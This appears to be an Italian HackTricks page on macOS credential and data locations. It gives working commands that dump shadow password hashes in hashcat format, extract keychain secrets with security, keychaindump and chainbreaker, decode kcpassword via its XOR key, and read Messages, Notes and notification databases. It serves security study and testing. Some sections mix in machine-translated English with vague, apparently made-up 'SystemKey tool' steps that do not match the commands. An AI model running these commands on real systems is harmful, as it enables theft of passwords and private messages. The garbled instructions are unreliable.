# Posizioni Sensibili di macOS

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) di github.

</details>

## Password

### Password Shadow

La password shadow viene memorizzata insieme alla configurazione dell'utente in plists situati in **`/var/db/dslocal/nodes/Default/users/`**.\
Il seguente oneliner può essere utilizzato per estrarre **tutte le informazioni sugli utenti** (inclusi i dettagli dell'hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Script come questo**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**questo**](https://github.com/octomagon/davegrohl.git) possono essere utilizzati per trasformare l'hash nel formato **hashcat**.

Un'alternativa one-liner che scaricherà le credenziali di tutti gli account non di servizio nel formato hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Dump delle chiavi

Nota che quando si utilizza il binario di sicurezza per **effettuare il dump delle password decriptate**, verranno richiesti diversi prompt all'utente per consentire questa operazione.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Basato su questo commento [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) sembra che questi strumenti non funzionino più in Big Sur.
{% endhint %}

### Panoramica di Keychaindump

È stato sviluppato uno strumento chiamato **keychaindump** per estrarre le password dalle chiavi di macOS, ma presenta limitazioni nelle versioni più recenti di macOS come Big Sur, come indicato in una [discussione](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). L'uso di **keychaindump** richiede all'attaccante di ottenere l'accesso e l'escalation dei privilegi a **root**. Lo strumento sfrutta il fatto che la chiave sia sbloccata di default al momento del login dell'utente per comodità, consentendo alle applicazioni di accedervi senza richiedere ripetutamente la password dell'utente. Tuttavia, se un utente sceglie di bloccare la propria chiave dopo ogni utilizzo, **keychaindump** diventa inefficace.

**Keychaindump** opera mirando a un processo specifico chiamato **securityd**, descritto da Apple come un demone per operazioni di autorizzazione e crittografia, fondamentale per accedere alla chiave. Il processo di estrazione prevede l'individuazione di una **Master Key** derivata dalla password di accesso dell'utente. Questa chiave è essenziale per leggere il file della chiave. Per individuare la **Master Key**, **keychaindump** analizza l'heap di memoria di **securityd** utilizzando il comando `vmmap`, cercando possibili chiavi all'interno delle aree contrassegnate come `MALLOC_TINY`. Il seguente comando viene utilizzato per ispezionare queste posizioni di memoria:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Dopo aver identificato le potenziali chiavi principali, **keychaindump** cerca tra gli heap un pattern specifico (`0x0000000000000018`) che indica un candidato per la chiave principale. Sono necessari ulteriori passaggi, inclusa la deobfuscation, per utilizzare questa chiave, come descritto nel codice sorgente di **keychaindump**. Gli analisti che si concentrano su questa area dovrebbero notare che i dati cruciali per decrittare il portachiavi sono memorizzati nella memoria del processo **securityd**. Un esempio di comando per eseguire **keychaindump** è:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) può essere utilizzato per estrarre i seguenti tipi di informazioni da un keychain di OSX in modo forense:

* Password del keychain hashata, adatta per essere craccata con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
* Password di Internet
* Password generiche
* Chiavi private
* Chiavi pubbliche
* Certificati X509
* Note sicure
* Password di Appleshare

Con la password di sblocco del keychain, una chiave principale ottenuta utilizzando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un file di sblocco come SystemKey, Chainbreaker fornirà anche le password in chiaro.

Senza uno di questi metodi per sbloccare il Keychain, Chainbreaker mostrerà tutte le altre informazioni disponibili.

#### **Dump delle chiavi del keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del portachiavi (con password) con SystemKey**

To dump the keychain keys (including passwords) using SystemKey, follow these steps:

Per effettuare il dump delle chiavi del portachiavi (inclusi le password) utilizzando SystemKey, seguire i seguenti passaggi:

1. Download and compile the SystemKey tool from the official repository.

   Scaricare e compilare lo strumento SystemKey dal repository ufficiale.

2. Run the SystemKey tool with the appropriate command-line options to dump the keychain keys.

   Eseguire lo strumento SystemKey con le opportune opzioni della riga di comando per effettuare il dump delle chiavi del portachiavi.

3. The tool will extract the keychain keys, including any associated passwords, and save them to a file.

   Lo strumento estrarrà le chiavi del portachiavi, inclusa qualsiasi password associata, e le salverà in un file.

By following these steps, you can successfully dump the keychain keys, including passwords, using the SystemKey tool.

Seguendo questi passaggi, è possibile effettuare con successo il dump delle chiavi del portachiavi, inclusi le password, utilizzando lo strumento SystemKey.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del portachiavi (con password) rompendo l'hash**

To dump the keychain keys with passwords, you can use the following steps:

1. First, obtain the hash of the keychain password. This can be done by extracting the hash from the appropriate file or by using a tool like `securitydumper`.

2. Once you have the hash, you can crack it using a password cracking tool such as `John the Ripper` or `Hashcat`. These tools use various techniques like brute-forcing or dictionary attacks to crack the hash and reveal the original password.

3. After cracking the hash, you can use the obtained password to decrypt and access the keychain keys. This can be done using tools like `security` or by writing a custom script.

It is important to note that cracking the hash and accessing the keychain keys without proper authorization is illegal and unethical. This technique should only be used for legitimate purposes, such as recovering lost passwords or conducting authorized security assessments.
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del portachiavi (con password) con il dump della memoria**

[Seguire questi passaggi](..#dumping-memory-with-osxpmem) per eseguire un **dump della memoria**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump delle chiavi del portachiavi (con password) utilizzando la password dell'utente**

Se conosci la password dell'utente, puoi utilizzarla per **effettuare il dump e decrittare i portachiavi che appartengono all'utente**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Il file **kcpassword** è un file che contiene la **password di accesso dell'utente**, ma solo se il proprietario del sistema ha **abilitato l'accesso automatico**. Pertanto, l'utente verrà automaticamente connesso senza dover inserire una password (cosa non molto sicura).

La password viene memorizzata nel file **`/etc/kcpassword`** xored con la chiave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Se la password dell'utente è più lunga della chiave, la chiave verrà riutilizzata.\
Ciò rende la password piuttosto facile da recuperare, ad esempio utilizzando script come [**questo**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Informazioni interessanti nei database

### Messaggi
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifiche

Puoi trovare i dati delle notifiche in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La maggior parte delle informazioni interessanti si troveranno nel **blob**. Quindi dovrai **estrarre** quel contenuto e **trasformarlo** in un formato **leggibile** dall'utente o utilizzare **`strings`**. Per accedervi puoi fare:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Note

Le note degli utenti possono essere trovate in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
